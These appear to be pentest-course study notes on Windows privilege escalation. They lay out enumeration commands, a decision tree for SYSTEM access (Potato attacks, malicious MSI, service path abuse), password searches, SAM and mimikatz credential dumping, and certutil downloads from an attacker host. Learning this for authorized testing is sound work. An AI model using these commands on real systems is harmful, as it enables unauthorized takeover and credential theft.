# Module 17 Windows Privilege Escalation

**Windows Privilege Escalation — Systematic Methodology**

**Phase 1 — Automated scan first:**
```cmd
# Transfer WinPEAS to target, then run
winpeas.exe > output.txt

# Or the batch version if .exe is blocked
winpeas.bat
```
Focus on RED highlights first — near-confirmed vectors.

**Phase 2 — Manual checks in priority order:**

**1. Who am I and what privileges:**
```cmd
whoami /priv           # check for SeImpersonate, SeBackup, etc.
whoami /groups         # group memberships
whoami /all            # everything
```
If you see `SeImpersonatePrivilege` → Potato attack.
If you see `SeBackupPrivilege` → can read any file including SAM.

**2. System information:**
```cmd
systeminfo             # OS version, patches, architecture
hostname
```
Note the OS build and hotfixes — for kernel exploits.

**3. Users and groups:**
```cmd
net user               # list local users
net user <username>    # details on specific user
net localgroup administrators   # who's admin
```

**4. Stored credentials:**
```cmd
cmdkey /list                          # saved credentials
reg query HKLM /f password /t REG_SZ /s   # registry passwords
dir /s *pass* == *.config              # config files
findstr /si password *.xml *.ini *.txt # search files for passwords
```

**5. AlwaysInstallElevated (instant SYSTEM if enabled):**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both return `0x1` → generate malicious MSI with msfvenom → runs as SYSTEM.

**6. Service vulnerabilities:**
```cmd
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Weak service permissions (need accesschk.exe)
accesschk.exe /accepteula -uwcqv <username> *
```

**7. Scheduled tasks:**
```cmd
schtasks /query /fo LIST /v | findstr /i "task to run\|run as user"
```
Look for tasks running as SYSTEM with a script you can modify.

**8. Running processes and services:**
```cmd
tasklist /svc
wmic service list brief
```

**9. Network / internal services:**
```cmd
netstat -ano            # listening ports, internal services
ipconfig /all
```

**10. Patch level for kernel exploits:**
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo             # feed into Windows Exploit Suggester
```

**The decision tree:**

```
Run WinPEAS
  ↓
whoami /priv → SeImpersonate? → Potato attack → SYSTEM
  ↓
AlwaysInstallElevated = 1? → malicious MSI → SYSTEM
  ↓
Stored credentials found? → use them / PtH
  ↓
Weak service permissions? → replace binpath → SYSTEM
  ↓
Unquoted service path + writable dir? → plant exe → SYSTEM
  ↓
Scheduled task as SYSTEM + writable script? → inject payload
  ↓
Nothing? → kernel exploit (Windows Exploit Suggester)
```

**Key privileges and their exploits:**

| Privilege | Exploit |
|-----------|---------|
| SeImpersonatePrivilege | PrintSpoofer / GodPotato |
| SeBackupPrivilege | Read SAM/SYSTEM, dump hashes |
| SeRestorePrivilege | Overwrite system files |
| SeTakeOwnershipPrivilege | Take ownership of any file |
| SeDebugPrivilege | Dump LSASS with Mimikatz |

**Credential dumping once you have SYSTEM:**
```cmd
# From SAM (local accounts)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# Then on Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Or Mimikatz for logged-in credentials
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Tools to have ready:**
- `winPEAS.exe` — automated enumeration
- `accesschk.exe` — check service/file permissions
- `PrintSpoofer.exe` / `GodPotato.exe` — SeImpersonate exploits
- `mimikatz.exe` — credential dumping
- Windows Exploit Suggester — kernel exploit matching

**File transfer to Windows target:**
```cmd
# On Kali
python3 -m http.server 80

# On Windows target
certutil -urlcache -f http://YOUR_IP/winpeas.exe winpeas.exe
# or PowerShell
powershell wget http://YOUR_IP/winpeas.exe -OutFile winpeas.exe
```

**One-sentence methodology:**
Run WinPEAS, check `whoami /priv` for exploitable privileges (especially SeImpersonate), check AlwaysInstallElevated and stored credentials, then service misconfigurations, and fall back to kernel exploits last.


---


## 17.1.2 Situational Awareness

```powershell
#Gets processes with name and path to it
Get-Process | Select-Object Name, Path
```

Or for more detail:
```powershell
Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath
```

```powershell
#Only non-standard process
Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath | Where-Object { $_.ExecutablePath -notlike "C:\Windows\*" -and $_.ExecutablePath -notlike "C:\Program Files*" -and $_.ExecutablePath -ne $null }
```

**What makes a process "non-standard":**

Standard Windows processes run from:
```
C:\Windows\System32\
C:\Windows\
C:\Program Files\
C:\Program Files (x86)\
```

A **non-standard** process runs from an unusual location like:
```
C:\Users\<user>\
C:\Temp\
C:\SomeCustomFolder\
```

## 17.1.3 Hidden in plain view

**Manual File Search**
> WinPEAS does NOT find these.
```bash
# Search common document types across all user folders
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xml,*.ini,*.config,*.log,*.kdbx -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# Public folder — often used to stash things
Get-ChildItem -Path C:\Users\Public\ -Recurse -ErrorAction SilentlyContinue

# mac's own Documents/Desktop/Downloads
Get-ChildItem -Path C:\Users\mac\ -Include *.txt,*.pdf,*.xml -File -Recurse -ErrorAction SilentlyContinue
```
